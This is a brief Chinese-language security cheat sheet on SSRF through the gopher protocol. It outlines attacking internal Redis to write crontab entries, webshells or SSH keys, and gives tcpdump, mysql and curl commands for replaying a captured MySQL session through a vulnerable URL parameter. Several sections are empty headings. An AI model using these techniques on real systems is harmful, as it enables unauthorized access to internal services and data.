# ✔️ SSRF

## Gopher协议

### KEY

```bash
http://example.com/?url=gopher://目标服务IP:服务端口/URL编码的指令
```

### 攻击Redis

* Redis运行在内网，端口**6379**，一般是**空口令**
* 未授权访问后可增删改查
* 若当前启动用户是root，则可**利用redis的导出功能**写入：crontab、webshell、SSH公钥









### 攻击MySQL

#### 查User表信息

1. 现在本地创建一个空user表，路径：/pcap/mysql.pcap
2. 使用tcpdump抓包，并将结果写入mysql.pcap文件中
3. 开启抓包后，登录MySQL服务，进行一个查询操作
4. 使用wireshark打开/pcap/mysql.pcap文件，过滤出MySQL，随便选择一个包追踪TCP流
5. 将其格式调整为HEX转储，进行URL编码
6. SSRF攻击：curl "http://目标域名.com:端口/?url=gopher://mysql服务所在IP:3306/此处接上一步的URL编码" | cat

```bash
// Attacker
tcpdump -i lo port 3306 -w /pcap/mysql.pcap

mysql -h 要连接MySQL数据库服务器的主机地址 -u 连接时使用的用户名
use ssrf
select * from user;
exit

curl "http://目标域名.com:端口/?url=gopher://mysql服务所在IP:3306/此处接上一步的URL编码" | cat
```

### PHP-FPM攻击









### 攻击内网中脆弱的WEB应用

